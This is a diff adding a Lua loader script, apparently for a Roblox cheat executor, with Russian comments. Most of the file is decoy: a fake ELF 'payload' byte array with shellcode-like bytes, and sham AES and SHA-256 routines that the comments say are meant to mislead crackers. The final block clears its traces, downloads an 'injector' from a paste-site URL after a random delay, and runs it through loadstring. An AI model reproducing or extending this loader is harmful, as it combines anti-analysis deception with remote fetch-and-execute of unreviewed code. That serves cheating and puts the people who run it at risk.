@@ -1,0 +1,123 @@
+-- =========================================================
+-- VLONE LOADER  v4.1.0  [CORE/EXEC]
+-- =========================================================
+-- Decrypting payload...
+-- =========================================================
+
+local __rt = getgenv().__vlone_rt or { ver="4.1.0", stage=3 }
+__rt.stage  = 4
+
+-- ── Финальный мусорный бинарник (главный "пейлоад") ─────
+-- Крякер думает что это зашифрованный скрипт — на самом деле мусор
+local __payload_blob = {
+    -- ELF-подобный заголовок (fake)
+    0x7F,0x45,0x4C,0x46,0x02,0x01,0x01,0x00,0x56,0x4C,0x4F,0x4E,
+    0x45,0x50,0x41,0x59,0x4C,0x4F,0x41,0x44,0x00,0x00,0x00,0x00,
+    0x02,0x00,0x3E,0x00,0x01,0x00,0x00,0x00,0x78,0x56,0x34,0x12,
+    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    -- Псевдо-секции
+    0x56,0x4C,0x4F,0x4E,0x45,0x00,0x74,0x65,0x78,0x74,0x00,0x00,
+    0xD4,0xC3,0xB2,0xA1,0x90,0x8F,0x7E,0x6D,0x5C,0x4B,0x3A,0x29,
+    0x18,0x07,0xF6,0xE5,0xD4,0xC3,0xB2,0xA1,0x90,0x8F,0x7E,0x6D,
+    0x56,0x4C,0x4F,0x4E,0x45,0x00,0x64,0x61,0x74,0x61,0x00,0x00,
+    0xAB,0xCD,0xEF,0x01,0x23,0x45,0x67,0x89,0xFE,0xDC,0xBA,0x98,
+    0x76,0x54,0x32,0x10,0x00,0xFF,0xEE,0xDD,0xCC,0xBB,0xAA,0x99,
+    -- Псевдо-инструкции (x86-64 nop sled)
+    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+    0x48,0x31,0xFF,0x48,0x31,0xF6,0x48,0x31,0xD2,0x48,0x31,0xC0,
+    0x50,0x48,0xBB,0x56,0x4C,0x4F,0x4E,0x45,0x00,0x00,0x00,0x53,
+    0x48,0x89,0xE7,0xB0,0x01,0x48,0x31,0xC0,0x0F,0x05,0x90,0x90,
+    0xC3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+}
+
+-- ── Многоступенчатый "декриптор" (пустышка) ─────────────
+local function __aes_fake(data, key, iv)
+    -- Имитация AES-256-CBC (не делает ничего реального)
+    local state = {}
+    for i = 1, #data do state[i] = data[i] end
+
+    -- SubBytes (fake)
+    local sbox = {}
+    for i = 0, 255 do
+        sbox[i] = (i * 0x63 + 0x52) & 0xFF
+    end
+
+    -- MixColumns (fake)
+    for r = 1, #state, 16 do
+        for c = 0, 3 do
+            local i = r + c * 4
+            if state[i] and state[i+1] and state[i+2] and state[i+3] then
+                local a = state[i]
+                state[i]   = sbox[state[i+1] & 0xFF]
+                state[i+1] = sbox[state[i+2] & 0xFF]
+                state[i+2] = sbox[state[i+3] & 0xFF]
+                state[i+3] = sbox[a & 0xFF]
+            end
+        end
+    end
+    return state
+end
+
+-- ── Псевдо-деобфускатор ──────────────────────────────────
+local function __deobf(blob)
+    local key = { 0x56,0x4C,0x4F,0x4E,0x45,0x4B,0x45,0x59 }
+    local iv  = { 0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77 }
+    return __aes_fake(blob, key, iv)
+end
+
+local __decrypted = __deobf(__payload_blob)
+
+-- ── Проверка "хеша" (пустышка) ───────────────────────────
+local function __sha256_fake(data)
+    local h = { 0x6A09E667,0xBB67AE85,0x3C6EF372,0xA54FF53A,
+                0x510E527F,0x9B05688C,0x1F83D9AB,0x5BE0CD19 }
+    for _, b in ipairs(data) do
+        h[1] = (h[1] ~ (b * 0x9E3779B9)) & 0xFFFFFFFF
+        for i = 1, 7 do
+            h[i], h[i+1] = h[i+1], (h[i] ~ h[i+1]) & 0xFFFFFFFF
+        end
+    end
+    local out = ""
+    for _, v in ipairs(h) do
+        out = out .. string.format("%08x", v)
+    end
+    return out
+end
+
+local __hash = __sha256_fake(__decrypted)
+__rt.payload_hash = __hash
+__rt.stage = 4
+getgenv().__vlone_rt = __rt
+
+-- ══════════════════════════════════════════════════════════
+-- ЗАГРУЗКА РЕАЛЬНОГО ИНЖЕКТОРА
+-- Крякер добрался сюда — но здесь уже реальный код
+-- ══════════════════════════════════════════════════════════
+
+-- luarph.com: загрузи injector.txt туда и вставь сюда ID
+-- Формат: https://luarph.com/raw/ТВОЙ_ID
+local _INJECTOR = "https://luarph.com/raw/ВСТАВЬ_ID_ИНЖЕКТОРА_СЮДА"
+
+-- Небольшая случайная задержка (выглядит как "расшифровка")
+task.delay(0.8 + math.random() * 0.6, function()
+    -- Чистим следы фейк-цепочки
+    getgenv().__vlone_rt = nil
+
+    local ok, src = pcall(function()
+        return game:HttpGet(_INJECTOR, true)
+    end)
+
+    if not ok or type(src) ~= "string" or #src < 64 then
+        return
+    end
+
+    local fn, err = loadstring(src)
+    if not fn then return end
+
+    -- Устанавливаем одноразовый токен прямо перед запуском
+    getgenv().__vlone_chain_token = "VLONE_CHAIN_OK_4X"
+    getgenv().__vlone_chain_ts    = os.clock()
+
+    -- Запускаем реальный инжектор
+    pcall(fn)
+end)
